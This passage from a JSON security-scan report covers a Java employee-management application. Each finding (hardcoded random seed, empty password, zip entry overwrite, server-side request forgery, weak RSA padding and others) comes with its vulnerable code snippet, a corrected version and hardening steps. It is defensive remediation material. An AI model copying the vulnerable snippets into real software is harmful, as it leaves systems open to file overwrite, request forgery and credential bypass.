"frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Insecure Randomness: Hardcoded Seed": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00458", "function": "setSeed()", "line": "369", "snippet": "Random r = new Random();\n\t        r.setSeed(12345);\n\t        int i = r.nextInt();\n\t        byte[] b = new byte[4];"}]}], "remediation": null}, "J2EE Bad Practices: Non-Serializable Object Stored in Session": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00461", "function": "FunctionCall: setAttribute()", "line": "207", "snippet": "mv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers\n\t\t\t\n\t\t\tHttpSession session = request.getSession();"}]}], "remediation": null}, "Null Dereference": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00466", "function": "Dereferenced : employeeSearch()", "line": "207", "snippet": "Root<EmployeeEntity> root = cr.from(EmployeeEntity.class);\n\t\t\n\t\tif(optSearch.isPresent() && employeeSearch.getEmpName()!=null && !employeeSearch.getEmpName().isEmpty()) {\n\t\t\tcr.select(root).where(cb.like(root.get(\"empName\"), \"%\" + employeeSearch.getEmpName() + \"%\"));\n\t\t} else {"}]}], "remediation": {"remediation": {"@id": "R.0038", "@name": "Null Dereference", "@dateLastModified": "6/5/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult ReadConnectionString(string txtConnectiongString)\n        {\n           var configuration = ConfigurationManager.GetSection(txtConnectiongString) as NameValueCollection;\n               \n                    var dbConnectionString = <em class=\"red\">configuration[&quot;ConnectionString&quot;]</em>;\n                    ViewData[&quot;DBConnectionString&quot;] = dbConnectionString;\n\n                \n            return View();\n        }", "nonvulncode": "public ActionResult ReadConnectionString(string txtConnectiongString)\n        {\n           var configuration = ConfigurationManager.GetSection(txtConnectiongString) as NameValueCollection;\n                <em class=\"blue\">if (configuration != null)</em>\n                {\n                    var dbConnectionString = configuration[&quot;ConnectionString&quot;];\n                    ViewData[&quot;DBConnectionString&quot;] = dbConnectionString;\n\n               }\n            return View();\n        }", "comments": "Always perform null checking on the object before using it to avoid null pointer exception. \nDo not assume the environment or external variables will always be there for the code. Pay special attention to variables returning from a web service and include in the test scenarios when those are not accessible, overloaded, or failed to retrieve due to a timeouts. Also keep in mind that properties returned from web-services and external components may change after upgrading the systems, infrastructure or applying patches to it (e.g. upgrading to a new version of an Apache plugin may remove access to some local variables, or rename others).\nDetect all possible exceptions and fail gracefully.", "impact": "No impact. Improved data management inside the code.", "abstract": "Use of Null check"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean)\n\t{\t\t\n\t\t<em class=\"red\">if(userAccountBean.getUserName()!=null) </em>{\n\t\t\tuserAccountBean.setRoleID(&quot;role000002&quot;);\n\t\t\tString escapedVal = StringEscapeUtils.escapeHtml4(userAccountBean.getUserName());\n\t\t\t\n\t\t\tuserAccountBean.setUserName(escapedVal);\n\t\t\tuserAccountBean = dao.addUser(userAccountBean);\t\t\t\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,userAccountBean);\n\n\t\t} else {\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,new UserAccountBean());\n\t\t}\n\t}", "nonvulncode": "public ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean)\n\t{\n\t\t<em class=\"blue\">Optional&lt;UserAccountBean&gt; optUserAcc = Optional.ofNullable(userAccountBean);</em>\n\t\tif( <em class=\"blue\">optUserAcc.isPresent() </em>&& optUserAcc.get().getUserName()!=null) {\n<em class=\"blue\">userAccountBean= optUserAcc.get();</em>\n\t\t\tuserAccountBean.setRoleID(&quot;role000002&quot;);\n\t\t\tString escapedVal = StringEscapeUtils.escapeHtml4(userAccountBean.getUserName());\n\t\t\t\n\t\t\tuserAccountBean.setUserName(escapedVal);\n\t\t\tuserAccountBean = dao.addUser(userAccountBean);\t\t\t\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,userAccountBean);\n\n\t\t} else {\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,new UserAccountBean());\n\t\t}\n\t}", "comments": "Null check or isPresent check need to be done before performing any action(get/set) on particular object.\nOptional helps by making sure whoever is using an Optional knows that the value may not exist, and in some cases helps a programmer to do the equivalent of null checking for code to even compile.\nHowever, Optional.of will still throw null pointer exception if object is null, so Optional.ofNullable to used.", "impact": "No impact. Improved data management inside the code. \nMay need to implement Optional&lt;\u2026&gt; on all objects in the code.", "abstract": "Use of isPresent"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean)\n\t{\t\t\n\t\t<em class=\"red\">if(userAccountBean.getUserName()!=null) </em>{\n\t\t\tuserAccountBean.setRoleID(&quot;role000002&quot;);\n\t\t\tString escapedVal = StringEscapeUtils.escapeHtml4(userAccountBean.getUserName());\n\t\t\t\n\t\t\tuserAccountBean.setUserName(escapedVal);\n\t\t\tuserAccountBean = dao.addUser(userAccountBean);\t\t\t\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,userAccountBean);\n\n\t\t} else {\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,new UserAccountBean());\n\t\t}\n\t}", "nonvulncode": "public ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean)\n\t{\n                        if( userAccountB<em class=\"blue\">ean != null  && </em>userAccountBean.getUserName()!=null<em class=\"bold\"> ) </em>{\n\t\t\tuserAccountBean.setRoleID(&quot;role000002&quot;);\n\t\t\tString escapedVal = StringEscapeUtils.escapeHtml4(userAccountBean.getUserName());\n\t\t\t\n\t\t\tuserAccountBean.setUserName(escapedVal);\n\t\t\tuserAccountBean = dao.addUser(userAccountBean);\t\t\t\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,userAccountBean);\n\n\t\t} else {\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,new UserAccountBean());\n\t\t}\n\t}", "comments": "Check if the object is instantiated before calling a method inside it.", "impact": "no impact on the performance, but for critical and sensitive applications, developer is required to add this checks in many parts of the code to avoid creating a null deference.", "abstract": "Use of Null check"}]}, "mitigations": {"mitigation": [{"system": "OS Linux", "configuration": "/etc/security/limits.conf", "backend": "ulimit -c 0", "frontend": "see backend code section", "comments": "Most Linux systems have core dumps enabled by default. As always, there is a tradeoff to make here. On one hand, we want to gather data for improved stability and troubleshooting. On the other, we want to limit the debug data and avoid leaking sensitive data.\n\nThe first option is good for machines where unstable programs need to be investigated, like the workstation of a developer. The second option is better suited for production systems storing or processing sensitive data.\n\nDisable the core dump generation on Linux machines. \nRefer to https://linux-audit.com/understand-and-configure-core-dumps-work-on-linux/ to other options\nhttps://linuxhint.com/linux_ulimit_command/"}, {"system": "Web Server / IIS", "configuration": "Web.config", "backend": "Configure the web server to use custom error pages instead of the default ones. \nThe custom error should be generic and do not expose any user, server or system information.\nreference: https://docs.microsoft.com/en-us/troubleshoot/aspnet/custom-error-reporting-page\nEx1:\nWeb.config\n    &lt;customErrors  mode=&quot;On&quot;&gt;\n      &lt;error statusCode=&quot;401&quot; redirect=&quot;/default.aspx&quot; /&gt;\n      &lt;error statusCode=&quot;402&quot; redirect=&quot;/default.aspx&quot; /&gt;\n      &lt;error statusCode=&quot;403&quot; redirect=&quot;/default.aspx&quot; /&gt;\n      &lt;error statusCode=&quot;500&quot; redirect=&quot;/default.aspx&quot; /&gt;\n    &lt;/customErrors&gt;\nEx2:\nWeb.config\n&lt;customErrors defaultRedirect=&quot;http://hostName/applicationName/errorStatus.htm&quot; mode=&quot;On&quot;&gt;\n&lt;/customErrors&gt;", "frontend": "&lt;default.aspx&gt;\nOps, this page contains an error that prevents the application to continue. Please try again.\n&lt;YYYY/MM/DD-HH24:MM:SS.sss-TMZ&gt;", "comments": "Create an error page that contains only a timestamp and a customized generic error message. \nFor throubleshoot, map errors on the log files with the timestamp, when needed.\n\nTo avoid re-ocurrence of this vulnerability after applying patches, or updates on the application/web server, it is recommended to:\n  Create test scripts and monitoring use cases to check if generic error message is set.\n  Configure the web server and make sure the same setting is applied to all application nodes (e.g., cluster, dockers, DDoS protection, multi-instances, cloud Elastic-IP,... )\n  Update installation scripts, configuration files, hardening guides, and Change Management documentation for the web server to ensure custom errors is always set."}]}}}}, "Often Misused: Boolean.getBoolean()": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00469", "function": "getBoolean()", "line": "313", "snippet": "{\n\t\tString isValid = \"true\";\n\t\t if ( Boolean.getBoolean(isValid) ) {\n\t\t     System.out.println(\"TRUE\");\n\t\t }"}]}], "remediation": null}, "Password Management: Empty Password": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00470", "function": "VariableAccess: storedPassword", "line": "242", "snippet": "String mailMessage=null;\n\t\tString storedPassword = \"\";\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {\n\t\t\t//File absolute path given, absolute path should begin with /"}]}], "remediation": {"remediation": {"@id": "R.0014", "@name": "Password Management: Empty Password", "@dateLastModified": "1/15/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult ReadConnectionString(string txtConnectiongString,string txtConfigPassword)\n        {\n            try\n            {\n               <em class=\"red\"> string storedPassword = &quot;&quot;;</em>\n                storedPassword = ReadPassword();//Read Password from the config file\n               //compare the password with config file if match with the user input\n                if (storedPassword.Equals(txtConfigPassword))\n                {\n                   \n                    NameValueCollection configuration = null;\n                    if (configuration == null)\n                    {\n                        configuration = ConfigurationManager.GetSection(txtConnectiongString) as NameValueCollection;\n                        var dbConnectionString = configuration[&quot;ConnectionString&quot;];\n                        ViewData[&quot;DBConnectionString&quot;] = dbConnectionString;\n                    }\n                }\n            }\n            catch (ArgumentException adEx)\n            {\n                ViewData[&quot;ErrorMessage&quot;] = adEx.Message.ToString();\n            }\n            catch(ConfigurationException confEx)\n            {\n                ViewData[&quot;ErrorMessage&quot;] = confEx.Message.ToString();\n            }\n            catch (Exception ex)\n            {\n                ViewData[&quot;Error&quot;] = ex.Message.ToString();\n            }\n            return View();\n        }", "nonvulncode": "public ActionResult ReadConnectionString(string txtConnectiongString, string txtConfigPassword)\n        {\n            try\n            {\n                <em class=\"blue\">string storedPassword = ReadPassword();//Read Password from the config file\n                string encyptionKey = ConfigurationManager.AppSettings[&quot;hardcoded_Key&quot;].ToString();\n                string encyptedPassword = ManageConfigFileController.EncryptString(txtConfigPassword, encyptionKey);</em>\n\n\n               <em class=\"blue\"> if(!string.IsNullOrEmpty(storedPassword) && storedPassword.Equals(encyptedPassword))</em>\n                {\n                    var configuration = ConfigurationManager.GetSection(txtConnectiongString) as NameValueCollection;\n                    if (configuration != null)\n                    {\n                        var dbConnectionString = configuration[&quot;ConnectionString&quot;];\n                        ViewData[&quot;DBConnectionString&quot;] = dbConnectionString;\n\n                    }\n                }else\n                {\n                    ViewData[&quot;ErrorMessage&quot;] = &quot;Invalid Password.&quot;;\n                }\n                \n            }\n            catch (ArgumentException adEx)\n            {\n                ViewData[&quot;ErrorMessage&quot;] = adEx.Message.ToString();\n            }\n            catch(ConfigurationException confEx)\n            {\n                ViewData[&quot;ErrorMessage&quot;] = confEx.Message.ToString();\n            }\n            catch (Exception ex)\n            {\n                ViewData[&quot;ErrorMessage&quot;] = ex.Message.ToString();\n            }\n            return View();\n        }", "comments": "The problem with the vulnerable code, if the ReadPassword methods fails to retrieved the password from the config/database because of the issue, the storedpassword will still be null. Attacker could bypass by not passing a value (the default is null in our example) and it will pass the condition.\n\nEnsure the password is never set as empty or null because this is against the password policies, and it may compromise the application as most of the hacker tools will automatically test for null and empty passwords.", "impact": "Setup a configuration file (app.config, web.config), that stores the encrypted password and/or keys to the used by the application. \nProtect the configuration files from unauthorized access. \nThe production configuration and Dev/FQA configuration files are usually different, and eventually passoword on Dev/FQA may be blank. Those files need to be managed/replaced when deploying to production, and checked tyo verify the null password never reach production (e.g., as a step in the Change Management process).\n\nFor reference, see: \n https://docs.microsoft.com/en-us/iis/manage/configuring-security/using-encryption-to-protect-passwords", "abstract": "provide password in encrypted form"}, {"@type": "JAVA/JSP", "vulncode": "public String sendEmail(String to, String subject, String body) \n    {\n\t\t\n\t\tString mailMessage=null;\n\t\t<em class=\"red\">String storedPassword = &quot;&quot;;</em>\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\t\t\t\tProperties prop = new Properties();\t\t\n\t\t\t\tprop.load(input);\n\t\t\t\tString host = prop.getProperty(&quot;sec_email_host&quot;);\n\t\t\t\t<em class=\"red\">if(prop.getProperty(&quot;sec_email_pwd&quot;)!=null) {\n\t\t\t\t\tstoredPassword  = prop.getProperty(&quot;sec_email_pwd&quot;);\n\t\t\t\t}\n\t\t        SimpleMailMessage message = new SimpleMailMessage();\n\t\t        \n\t\t        JavaMailSenderImpl mailSender = new JavaMailSenderImpl();\n\t\t\t    mailSender.setHost(host);\n\t\t\t    mailSender.setPort(587);\n\t\t\t    \n\t\t\t    mailSender.setUsername(&quot;user@mail.com&quot;</em>);\n\t\t\t <em class=\"red\">   mailSender.setPassword(storedPassword); // password sent without null check and decrypting\n....\n}</em>", "nonvulncode": "public String sendEmail(String to, String subject, String body) \n    {\n\t\t\n\t\tString mailMessage=null;\n\t\t\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\t\t\t\tProperties prop = new Properties();\t\t\n\t\t\t\tprop.load(input);\n\t\t\t\tString host = prop.getProperty(&quot;sec_email_host&quot;);\n<em class=\"blue\">String storedPassword = prop.getProperty(&quot;sec_email_pwd&quot;);\nString key = prop.getProperty(&quot;sec_encrypt_decrypt_key&quot;);\n\necipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(new byte[16]));            \n            byte[] decrptByte=ecipher.doFinal(Base64.getDecoder().decode(storedPassword));            \n            String decryptedPwd = new String(decrptByte); \n\nif(!StringUtils.equals(null,decryptedPwd))){\n</em>\n\t\t        SimpleMailMessage message = new SimpleMailMessage();\n\t\t        \n\t\t        JavaMailSenderImpl mailSender = new JavaMailSenderImpl();\n\t\t\t    mailSender.setHost(host);\n\t\t\t    mailSender.setPort(587);\n\t\t\t    \n\t\t\t    mailSender.setUsername(&quot;user@mail.com&quot;);\n\t\t\t    <em class=\"blue\">mailSender.setPassword(decryptedPwd); // sending the decrypted password</em>\nProperties props = mailSender.getJavaMailProperties();\nprops.put(&quot;mail.transport.protocol&quot;, &quot;smtp&quot;);\nprops.put(&quot;mail.smtp.auth&quot;, &quot;true&quot;);\nprops.put(&quot;mail.smtp.<em class=\"blue\">starttls</em>.enable&quot;, &quot;true&quot;);\nprops.put(&quot;mail.debug&quot;, &quot;true&quot;);\n...\n}\n}", "comments": "The problem with the vulnerable code, if the reading password from  the config/database fails, the storedpassword will still be null. Attacker could bypass by not passing a value (the default is null in our example) and it will pass the condition.\n\nEnsure the password is never set as empty or null because this is against the password policies, and it may compromise the application as most of the hacker tools will automatically test for null and empty passwords.", "impact": "Setup a configuration file (app.config, web.config), that stores the encrypted password and/or keys to the used by the application. \nProtect the configuration files from unauthorized access. \nThe production configuration and Dev/FQA configuration files are usually different, and eventually passoword on Dev/FQA may be blank. Those files need to be managed/replaced when deploying to production, and checked tyo verify the null password never reach production (e.g., as a step in the Change Management process).", "abstract": "Use of encrypted password"}]}, "mitigations": {"mitigation": [{"system": "OS Linux", "configuration": "Protect the configuration files, removing the write permission to others than file owner.", "backend": "check all files and folders with write permissions on Linux: \nfind / -perm /752 -type f -ls &gt; wwfiles\nfind / -perm /752 -type d -ls &gt; wwdirs\nchmod 500 *.conf", "frontend": "see backend code section", "comments": "By Changing the file permission , you can protect the files from unauthorised access or modification.\n\nReference: \nhttps://linoxide.com/linux-command/chmod-command/#:~:text=500%20%3A%20set%20read%2Bexecute%20permission,no%20permissions%20to%20the%20others%20.&text=When%20using%20the%20numeric%20method,%2C%20group%2C%20and%20others).\nhttp://www.filepermissions.com/file-permission/752#:~:text=Octal%20permissions%20can%20be%20made,not%2C%20and%20cannot%20be%20set.\nhttps://www.linuxtopia.org/online_books/linux_administrators_security_guide/06_Linux_File_System_and_File_Security.html"}, {"system": "OS Windows", "configuration": "Protect the configuration files, removing the write permission to others than file owner.", "backend": "Windows:\nPoweshell:\nGet-ChildItem -Recurse | Get-Acl | out-string -stream | select-string -pattern &quot;Everyone&quot;", "frontend": "see backend code section", "comments": "By Changing the file permission , you can protect the files from unauthorised access or modification.\n\nReference: \nhttps://social.technet.microsoft.com/Forums/windows/en-US/6bb630e7-8268-4e51-8abf-463ba330965a/using-getacl-to-list-only-those-files-that-have-specific-users-and-permissions?forum=winserverpowershell\nhttps://community.spiceworks.com/topic/2048852-get-folder-file-permissions-but-filter-for-one-security-group"}, {"system": "Cloud Enterprise password management system", "configuration": "&lt;depends on the system&gt;", "backend": "Configure all required secrets following security approved practices (e.g., password policies, rotation, etc.)\nProtect access to the vault to be limited to the application instances only (e.g., https://docs.microsoft.com/en-us/azure/key-vault/general/secure-your-key-vault)", "frontend": "Azure Key Vault Hardening: https://kxdocuments.accenture.com/contribution/b1c1522a-6814-458f-9308-ea6ad45aeb15\nThe Azure Automation Scripts Guide includes a brief description of the security controls that can be configured through the custom Azure automation scripts: Key Vault, PaaS Storage, Analysis-Services and Application Services.\n\nAWS Secrets Manager: \nhttps://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html\nhttps://aws.amazon.com/blogs/aws/aws-secrets-manager-store-distribute-and-rotate-credentials-securely/\nSecrets Manager enables you to replace hardcoded credentials in your code, including passwords, with an API call to Secrets Manager to retrieve the secret programmatically. This helps ensure the secret can't be compromised by someone examining your code, because the secret no longer exists in the code. \n\nGCP Secret Manager:\nhttps://cloud.google.com/secret-manager\nSecret Manager is a secure and convenient storage system for API keys, passwords, certificates, and other sensitive data. Secret Manager provides a central place and single source of truth to manage, access, and audit secrets across Google Cloud.\n\nCyberArk ENTERPRISE PASSWORD VAULT:\nhttps://www.cyberark.com/products/privileged-account-security-solution/enterprise-password-vault/\n\nThe Accenture Internal Git Repository \u2013 Cloud Hardening Toolkit has been created with the purpose of collaboration between different teams within Accenture. The Azure Automation Scripts, described in the following sections of this guide, can be downloaded from the folder \u201cAutomation Scripts\u201d created under the \u201cAzure\u201d repository.\nAzure Automation Scripts Repository \u2013 https://innersource.accenture.com/projects/CHTK/repos/azure/browse/Automation%20Scripts", "comments": "See the Supplementary Frontend Code section"}, {"system": "Web Server / IIS", "configuration": "IIS Manager interface", "backend": "1.Open the IIS Management Console (INETMGR.MSC).\n2.Open the Application Pools node underneath the machine node. Select the application pool you want to change to run under an automatically generated application pool identity.\n3.Right click the application pool and select Advanced Settings.\n4.Select the Identity list item and click the ellipsis (the button with the three dots).\n5.Select the Built-in account button, and then select the identity type ApplicationPoolIdentity from the combo box.\n\nvia Command Line :\n%windir%\\system32\\inetsrv\\appcmd.exe set AppPool &lt;your AppPool&gt; -processModel.identityType:ApplicationPoolIdentity", "frontend": "see backend code section", "comments": "On IIS, create a new application pool Identity, to store system credentials on it. Protect the encryption providers properly. \nWorker processes in IIS 6.0 and in IIS 7 run as Network Service by default. Network Service is a built-in Windows identity. It doesn't require a password and has only user privileges; that is, it is relatively low-privileged. Running as a low-privileged account is a good security practice because in case of an attack, a software bug can not be used by a malicious user to compromise the system without a privilege escalation, the last easier to be detected by SIEM tools.\n\nfor reference\nhttps://docs.microsoft.com/en-us/iis/manage/configuring-security/using-encryption-to-protect-passwords \nhttps://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities"}]}}}}, "Path Manipulation: Zip Entry Overwrite": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00471", "function": "java.io.FileOutputStream.FileOutputStream()", "line": "331", "snippet": "private void extractFile(ZipInputStream zipIn, String filePath) throws IOException {\n        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filePath));\n        byte[] bytesIn = new byte[BUFFER_SIZE];\n        int read = 0;"}]}], "remediation": {"remediation": {"@id": "R.0209", "@name": "Path Manipulation: Zip Entry Overwrite", "@dateLastModified": "8/7/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "private void ProcessZip(string filepath)\n        {\n            string extractPath = Server.MapPath(&quot;~/UploadedFiles&quot;);\n            using (ZipArchive archive = ZipFile.OpenRead(filepath))\n            {\n                foreach (ZipArchiveEntry entry in archive.Entries)\n                {\n                    string destinationPath = Path.GetFullPath(Path.Combine(extractPath, entry.FullName));\n                   <em class=\"red\"> entry.ExtractToFile(destinationPath, true);</em>\n                }\n            }\n        }", "nonvulncode": "private void ProcessZip(string filepath)\n        {\n            string extractPath = Server.MapPath(&quot;~/UploadedFiles&quot;);\n            <em class=\"blue\">char[] illegalcharacters = Path.GetInvalidFileNameChars(); //get all invalid characters</em>\n            using (ZipArchive archive = ZipFile.OpenRead(filepath))\n            {\n                foreach (ZipArchiveEntry entry in archive.Entries)\n                {\n                    <em class=\"blue\">string filename = illegalcharacters.Aggregate(entry.FullName, (current, c) =&gt; current.Replace(c, '_'));\n                    string destinationPath = Path.GetFullPath(Path.Combine(extractPath, filename));\n</em>                    entry.ExtractToFile(destinationPath, true);\n                }\n            }\n        }", "comments": "Sanitize file names that are to be extracted from the zip before extracting those files.\nAn attacker could upload a zip file that contains the &quot;full path&quot;, and use it to override a local file. \nMake sure you can decompress the files in a safe place.\n\nNeed to protect local files against unauthorized changes.\nProtect logs from tampering\nProtect local configurations against unauthorized changes", "impact": "No performance impact. Will need to change the code, recompile and test the application.", "abstract": "Use of regexps"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView processUpload(@RequestParam(&quot;file&quot;) CommonsMultipartFile file) throws IOException,MultipartException {\n\t\tModelAndView mv= new ModelAndView();\n\n\t\tif (!file.isEmpty()) {\n\t\t\tString name = file.getOriginalFilename();\n\t\t\tString extension = FilenameUtils.getExtension(file.getOriginalFilename());\n\t\t\tString rootPath = System.getProperty(&quot;catalina.home&quot;);\n\t\tif (&quot;zip&quot;.equals(extension)) {\n\t\t\t\tString destDirectory = rootPath + File.separator + &quot;tmpFiles&quot;;\n\t\t\t\tFile destDir = new File(destDirectory);\n\t\t        if (!destDir.exists()) {\n\t\t            destDir.mkdir();\n\t\t        }\n\t\t        ZipInputStream zipIn = new ZipInputStream(file.getInputStream());\n\t\t        ZipEntry entry = zipIn.getNextEntry();\n\t\t        // iterates over entries in the zip file\n\t\t        while (entry != null && !entry.isDirectory()) {\n\t\t            String filePath = destDirectory + File.separator + entry.getName();\n<em class=\"red\">\t\t//File is getting extracted without path getting checked</em>            \n\t\t            if (!entry.getName().contains(&quot;/&quot;)) {\n\t\t                // if the entry is a file, extracts it\n\t\t                extractFile(zipIn, filePath);\n\t\t            } else {\n\t\t                // if the entry is a directory, make the directory\n\t\t            \tint index= filePath.lastIndexOf(&quot;/&quot;);\n\t\t            \tString dirPath = filePath.substring(0, index);\n\t\t                File dir = new File(dirPath);\n\t\t                if(!dir.exists()) {\n\t\t                \tdir.mkdir()\n\t\t                }\n\t\t                extractFile(zipIn, filePath);\n\t\t            }\n\t\t            zipIn.closeEntry();\n\t\t            entry = zipIn.getNextEntry();\n\t\t        }\n\t\t        zipIn.close();\n\t\t        \n\t\t        mv.setViewName(&quot;uploadFile&quot;);\n\t\t\t\tmv.addObject(&quot;msg&quot;,&quot;You successfully uploaded file=&quot; + name);\n\t\t    } \n\t\treturn mv;\n\t}", "nonvulncode": "private void checkZipEntryOverwrite(File destinationDir, ZipEntry zipEntry) throws IOException {\n        File destFile = new File(destinationDir, zipEntry.getName());\n        \n        String destDirPath = destinationDir.getCanonicalPath();\n        String destFilePath = destFile.getCanonicalPath();\n        \n        if (!destFilePath.startsWith(destDirPath + File.separator)) {\n            throw new IOException(&quot;Entry is outside of the target dir: &quot; + zipEntry.getName());\n      <em class=\"blue\">  }\n        \n    }\n</em>\tpublic ModelAndView processUpload(@RequestParam(&quot;file&quot;) CommonsMultipartFile file) throws IOException,MultipartException {\n\t\tModelAndView mv= new ModelAndView();\n\n\t\tif (!file.isEmpty()) {\n\t\t\tString name = file.getOriginalFilename();\n\t\t\tString extension = FilenameUtils.getExtension(file.getOriginalFilename());\n\t\t\tString rootPath = System.getProperty(&quot;catalina.home&quot;);\n\t\tif (&quot;zip&quot;.equals(extension)) {\n\t\t\t\tString destDirectory = rootPath + File.separator + &quot;tmpFiles&quot;;\n\t\t\t\tFile destDir = new File(destDirectory);\n\t\t        if (!destDir.exists()) {\n\t\t            destDir.mkdir();\n\t\t        }\n\t\t        ZipInputStream zipIn = new ZipInputStream(file.getInputStream());\n\t\t        ZipEntry entry = zipIn.getNextEntry();\n\t\t        // iterates over entries in the zip file\n\t\t        while (entry != null && !entry.isDirectory()) {\n\t\t            String filePath = destDirectory + File.separator + entry.getName();\n\t\t            <em class=\"blue\">checkZipEntryOverwrite(destDir,entry);</em>\n\t\t\t\t\t\n\t\t            if (!entry.getName().contains(&quot;/&quot;)) {\n\t\t                // if the entry is a file, extracts it\n\t\t                extractFile(zipIn, filePath);\n\t\t            } else {\n\t\t                // if the entry is a directory, make the directory\n\t\t            \tint index= filePath.lastIndexOf(&quot;/&quot;);\n\t\t            \tString dirPath = filePath.substring(0, index);\n\t\t                File dir = new File(dirPath);\n\t\t                if(!dir.exists()) {\n\t\t                \tdir.mkdir()\n\t\t                }\n\t\t                extractFile(zipIn, filePath);\n\t\t            }\n\t\t            zipIn.closeEntry();\n\t\t            entry = zipIn.getNextEntry();\n\t\t        }\n\t\t        zipIn.close();\n\t\t        \n\t\t        mv.setViewName(&quot;uploadFile&quot;);\n\t\t\t\tmv.addObject(&quot;msg&quot;,&quot;You successfully uploaded file=&quot; + name);\n\t\t    } \n\t\treturn mv;\n\t}", "comments": "Sanitize file names that are to be extracted from the zip before extracting those files.\n\nAn attacker could upload a zip file that contains the &quot;full path&quot;, and use it to override a local file. \n\nMake sure you can decompress the files in a safe place.\n\nWe can either sanitize the input file name inside zip, or validate the target path. If the target path navigates from destination directory, validation IOException can be thrown, abort the process and send an error to the user.\n\nNeed to protect local files against unauthorized changes.\nProtect logs from tampering\nProtect local configurations against unauthorized changes", "impact": "No performance impact. Will need to change the code, recompile and test the application.", "abstract": "Use of canonical path"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Server-Side Request Forgery": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00476", "function": "org.apache.http.client.methods.HttpGet.HttpGet()", "line": "1155", "snippet": "String urlR = request.getParameter(\"url\");\n\t\tif(urlR!=null) {\n\t\tHttpGet httpGetR = new HttpGet(urlR);\n\t\tCloseableHttpResponse httpResponseR = httpClient.execute(httpGetR);\n\t\t}"}]}], "remediation": null}, "Unreleased Resource: Sockets": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00479", "function": "httpClient = createDefault()", "line": "1140", "snippet": "public ModelAndView sendGET(String attuid,HttpServletRequest request) throws IOException {\n\t\tModelAndView mv = new ModelAndView();\n\t\tCloseableHttpClient httpClient = HttpClients.createDefault();\n\t\ttry (InputStream input = EmployeeController.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {"}]}], "remediation": null}, "Weak Encryption: Inadequate RSA Padding": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00482", "function": "getInstance()", "line": "532", "snippet": "//Cipher cipher = Cipher.getInstance(\"RSA/NONE/OAEPWithSHA1AndMGF1Padding\");\n\t\t\tCipher cipher = Cipher.getInstance(\"RSA\");\n\t\t\t// Initialize Cipher for ENCRYPT_MODE\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, publicKey);"}]}], "remediation": {"remediation": {"@id": "R.0099", "@name": "Weak Encryption: Inadequate RSA Padding", "@dateLastModified": "8/7/2020", "faqs": {"faq": {"question": "The system is already using RSA for encryption. Why is this not suficient?", "answer": "RSA is a good encryption algorithm, but is vulnerable to some types of attacks (broadcast, brute force, etc.). Many of those attacks are becoming possible as the computing power, rainbow tables and quantum computing are getting available to the public. To increase the time for an attacker to succeed, some extra protections are recommended to be in place. One of such is the use of padding."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Encryption_RSA()\n        {\n            Create_RSAKey();\n            string 